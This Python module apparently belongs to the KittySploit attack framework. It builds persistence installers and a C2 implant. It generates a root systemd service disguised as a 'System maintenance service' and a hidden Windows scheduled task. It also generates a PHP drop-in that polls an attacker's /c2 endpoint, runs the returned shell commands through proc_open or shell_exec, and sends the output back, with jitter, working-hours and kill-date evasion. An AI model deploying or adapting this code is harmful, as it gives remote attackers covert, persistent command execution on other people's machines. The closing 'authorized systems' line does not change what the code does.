#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Shared install script builders for persistent Kitty agents."""

from __future__ import annotations

from typing import Optional


def build_systemd_unit(
    service_name: str,
    exec_start: str,
    *,
    description: str = "System maintenance service",
    user: str = "root",
    restart_sec: int = 5,
) -> str:
    """Return a systemd unit file body."""
    return f"""[Unit]
Description={description}
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart={exec_start}
Restart=always
RestartSec={restart_sec}
User={user}

[Install]
WantedBy=multi-user.target
"""


def build_linux_install_sh(
    *,
    install_dir: str,
    agent_filename: str,
    service_name: str,
    python_binary: str = "python3",
    unit_description: str = "System maintenance service",
) -> str:
    """Install agent under /opt and enable a systemd unit."""
    install_dir = install_dir.rstrip("/")
    exec_start = f"{python_binary} {install_dir}/{agent_filename}"
    unit = build_systemd_unit(
        service_name,
        exec_start,
        description=unit_description,
    ).rstrip()
    return f"""#!/bin/bash
set -e
INSTALL_DIR="{install_dir}"
AGENT="{agent_filename}"
SERVICE="{service_name}"
PY="{python_binary}"

if [ "$(id -u)" -ne 0 ]; then
  echo "Run as root: sudo $0" >&2
  exit 1
fi

mkdir -p "$INSTALL_DIR"
if [ -f "./$AGENT" ]; then
  cp "./$AGENT" "$INSTALL_DIR/$AGENT"
elif [ -f "$AGENT" ]; then
  cp "$AGENT" "$INSTALL_DIR/$AGENT"
else
  echo "Missing agent file: $AGENT (run from output directory)" >&2
  exit 1
fi
chmod 700 "$INSTALL_DIR/$AGENT"

UNIT="/etc/systemd/system/$SERVICE.service"
cat > "$UNIT" <<'KSUNIT'
{unit}
KSUNIT

if command -v systemctl >/dev/null 2>&1 && [ -d /run/systemd/system ]; then
  systemctl daemon-reload
  systemctl enable "$SERVICE.service"
  systemctl restart "$SERVICE.service"
  systemctl --no-pager status "$SERVICE.service" || true
else
  nohup $PY "$INSTALL_DIR/$AGENT" >/dev/null 2>&1 &
fi
echo "Installed $INSTALL_DIR/$AGENT"
"""


def build_windows_schtasks_install_ps1(
    *,
    install_dir: str,
    agent_filename: str,
    task_name: str,
    python_binary: str = "python",
    run_level: str = "LIMITED",
    trigger: str = "ONLOGON",
    hidden: bool = True,
) -> str:
    """Register a scheduled task that runs the agent via pythonw when hidden."""
    install_dir = install_dir.rstrip("\\/")
    py = "pythonw" if hidden and python_binary.lower() in ("python", "python3", "py") else python_binary
    run_level_xml = "HighestAvailable" if run_level.upper() == "HIGHEST" else "LeastPrivilege"
    trigger_map = {
        "ONLOGON": "AtLogon",
        "ONSTART": "AtStartup",
        "ONIDLE": "AtIdle",
    }
    trigger_flag = trigger_map.get(trigger.upper(), "AtLogon")
    hidden_switch = "-Hidden" if hidden else ""
    return f"""# Requires Administrator
$ErrorActionPreference = 'Stop'
$InstallDir = '{install_dir}'
$Agent = '{agent_filename}'
$TaskName = '{task_name}'
$Python = '{py}'

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {{
  Write-Error 'Run as Administrator'
}}

New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null
$src = Join-Path (Get-Location) $Agent
if (-not (Test-Path $src)) {{ $src = $Agent }}
if (-not (Test-Path $src)) {{ throw "Missing agent file: $Agent" }}
Copy-Item -Force $src (Join-Path $InstallDir $Agent)

$agentPath = Join-Path $InstallDir $Agent
$action = New-ScheduledTaskAction -Execute $Python -Argument "`"$agentPath`""
$trigger = New-ScheduledTaskTrigger -{trigger_flag}
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable {hidden_switch}
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel {run_level_xml}
Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
Start-ScheduledTask -TaskName $TaskName
Write-Host "Installed $agentPath (task: $TaskName)"
"""


def build_php_polling_dropin(
    host: str,
    port: int,
    client_id: str,
    *,
    url_prefix: str = "/c2",
    poll_interval: float = 10.0,
    use_ssl: bool = False,
    user_agent: str = "Mozilla/5.0",
    jitter_percent: float = 0.0,
    kill_date: str = "",
    working_hours: str = "",
    timezone: str = "UTC",
    sleep_outside_hours: float = 3600.0,
) -> str:
    """PHP drop-in that polls reverse_http_polling (shell commands + basic beacon profile)."""
    scheme = "https" if use_ssl else "http"
    prefix = "/" + str(url_prefix or "/c2").strip("/")
    port_suffix = ""
    if (use_ssl and port != 443) or (not use_ssl and port != 80):
        port_suffix = f":{int(port)}"
    kill_date_lit = str(kill_date or "")
    working_hours_lit = str(working_hours or "")
    return f"""<?php
// KittySploit HTTP polling drop-in — run via cron, include, or web hit
@set_time_limit(0);
@ignore_user_abort(true);

$HOST = {host!r};
$PORT = {int(port)};
$CID = {client_id!r};
$PREFIX = {prefix!r};
$POLL = {float(poll_interval)};
$JITTER = {float(jitter_percent)};
$UA = {user_agent!r};
$KILL_DATE = {kill_date_lit!r};
$WORKING_HOURS = {working_hours_lit!r};
$TZ = {timezone!r};
$SLEEP_OUTSIDE = {float(sleep_outside_hours)};
$BASE = '{scheme}://' . $HOST . '{port_suffix}' . $PREFIX;

function ks_jitter($base, $pct) {{
    if ($pct <= 0) return max(1, (int)$base);
    $delta = (int)round($base * ($pct / 100.0));
    return max(1, (int)$base + random_int(-$delta, $delta));
}}

function ks_outside_hours() {{
    if ($WORKING_HOURS === '') return false;
    $parts = explode('-', $WORKING_HOURS, 2);
    if (count($parts) < 2) return false;
    try {{ @date_default_timezone_set($TZ); }} catch (Exception $e) {{}}
    $now = date('H:i');
    $start = trim($parts[0]); $end = trim($parts[1]);
    if ($start <= $end) return !($now >= $start && $now <= $end);
    return !($now >= $start || $now <= $end);
}}

function ks_past_kill() {{
    if ($KILL_DATE === '') return false;
    try {{ @date_default_timezone_set('UTC'); }} catch (Exception $e) {{}}
    return time() >= strtotime($KILL_DATE . ' 23:59:59 UTC');
}}

function ks_req($method, $path, $body = null, $headers = array()) {{
    $url = $BASE . $path;
    $hdrs = array_merge(array('User-Agent: ' . $UA), $headers);
    if (function_exists('curl_init')) {{
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $hdrs);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        if ($body !== null) curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        $out = curl_exec($ch);
        curl_close($ch);
        return $out;
    }}
    $ctx = stream_context_create(array('http' => array(
        'method' => $method,
        'header' => implode("\\r\\n", $hdrs),
        'content' => $body,
        'timeout' => 30,
    )));
    return @file_get_contents($url, false, $ctx);
}}

function ks_run($cmd) {{
    if (function_exists('proc_open')) {{
        $desc = array(1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
        $p = proc_open($cmd, $desc, $pipes);
        if (is_resource($p)) {{
            $out = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
            foreach ($pipes as $pipe) @fclose($pipe);
            $code = proc_close($p);
            if (trim($out) === '') $out = '[exit ' . $code . ']';
            return $out;
        }}
    }}
    $out = @shell_exec($cmd . ' 2>&1');
    return $out !== null ? $out : 'ERROR:exec failed';
}}

$qs = 'id=' . rawurlencode($CID);
while (true) {{
    if (ks_past_kill()) break;
    $sleep = ks_outside_hours() ? max(1, (int)$SLEEP_OUTSIDE) : ks_jitter($POLL, $JITTER);
    $raw = ks_req('GET', '/poll?' . $qs);
    if ($raw) {{
        $data = json_decode($raw, true);
        if (is_array($data)) {{
            $cmd = '';
            if (!empty($data['command'])) {{
                $cmd = ($data['encoding'] ?? '') === 'base64'
                    ? base64_decode($data['command'])
                    : (string)$data['command'];
            }} elseif (!empty($data['task']['command'])) {{
                $args = $data['task']['args'] ?? array();
                if (($data['task']['command'] ?? '') === 'shell') {{
                    $cmd = (string)($args['cmd'] ?? $args['command'] ?? '');
                }}
            }}
            if (trim($cmd) !== '') {{
                $out = ks_run($cmd);
                $body = json_encode(array(
                    'output' => base64_encode($out),
                    'encoding' => 'base64',
                    'id' => $CID,
                ));
                ks_req('POST', '/result?' . $qs, $body, array('Content-Type: application/json'));
            }}
        }}
    }}
    sleep($sleep);
}}
"""


def build_install_readme(
    *,
    title: str,
    callback: str,
    linux_cmd: Optional[str] = None,
    windows_cmd: Optional[str] = None,
    notes: Optional[str] = None,
) -> str:
    """Short README for generated installer packs."""
    lines = [
        f"# {title}",
        "",
        f"Callback: {callback}",
        "",
    ]
    if linux_cmd:
        lines.extend(["## Linux", "```bash", linux_cmd, "```", ""])
    if windows_cmd:
        lines.extend(["## Windows", "```powershell", windows_cmd, "```", ""])
    if notes:
        lines.extend(["", notes])
    lines.append("")
    lines.append("Use responsibly and only on authorized systems.")
    return "\n".join(lines)
